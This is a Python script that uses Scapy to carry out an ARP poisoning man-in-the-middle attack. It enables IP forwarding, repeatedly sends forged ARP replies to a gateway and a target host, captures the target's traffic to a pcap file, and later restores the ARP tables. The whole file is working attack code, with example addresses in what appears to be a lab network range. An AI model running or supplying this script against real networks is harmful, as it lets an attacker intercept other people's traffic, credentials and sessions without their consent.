from scapy.all import *
import os
import signal
import sys
import threading
import time

class ARPattack:
    def __init__(self, gateway_ip, gateway_mac, target_ip, target_mac, frequency, packet_count):
        #ARP Poison parameters
        self.gateway_ip = gateway_ip        #gateway_ip = "192.168.56.1"
        self.gateway_mac = gateway_mac
        self.target_ip = target_ip          #target_ip = "192.168.56.101"
        self.target_mac = target_mac
        self.frequency = frequency
        self.packet_count = packet_count    #packet_count = 1000

    def start_attack(gateway_ip, gateway_mac, target_ip, target_mac, frequency, pkt_cnt):
        #Start the script
        conf.iface = "enp0s3"
        conf.verb = 0
        print("[*] Starting script: arp_poison.py")
        print("[*] Enabling IP forwarding")
        #Enable IP Forwarding on a mac
        os.system("sysctl -w net.inet.ip.forwarding=1")
        print("[*] Gateway IP address: %s" %gateway_ip)
        print("[*] Target IP address: %s" %target_ip)

        #ARP poison thread
        poison_thread = threading.Thread(target=ARPattack.arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac, frequency))
        poison_thread.start()

        #Sniff traffic and write to file. Capture is filtered on target machine
        try:
            sniff_filter = "ip host " + target_ip
            print("[*] Starting network capture. Packet Count: %d. Filter: %s" %(pkt_cnt ,sniff_filter))
            packets = sniff(filter=sniff_filter, iface=conf.iface, count=pkt_cnt)
            wrpcap(target_ip + "_capture.pcap", packets)
            print("[*] Stopping network capture..Restoring network")
            ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        except KeyboardInterrupt:
            print("[*] Stopping network capture..Restoring network")
            ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
            sys.exit(0)

    #Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
    #correct MAC and IP Address information
    def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
        print("[*] Disabling IP forwarding")
        #Disable IP Forwarding on a mac
        os.system("sysctl -w net.inet.ip.forwarding=0")
        #kill process on a mac
        os.kill(os.getpid(), signal.SIGTERM)

    #Keep sending false ARP replies to put our machine in the middle to intercept packets
    #This will use our interface MAC address as the hwsrc for the ARP reply
    def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, frequency):
        print("[*] Started ARP poison attack [CTRL-C to stop]")
        try:
            while True:
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
                time.sleep(frequency)
        except KeyboardInterrupt:
            print("[*] Stopped ARP poison attack. Restoring network")
            ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
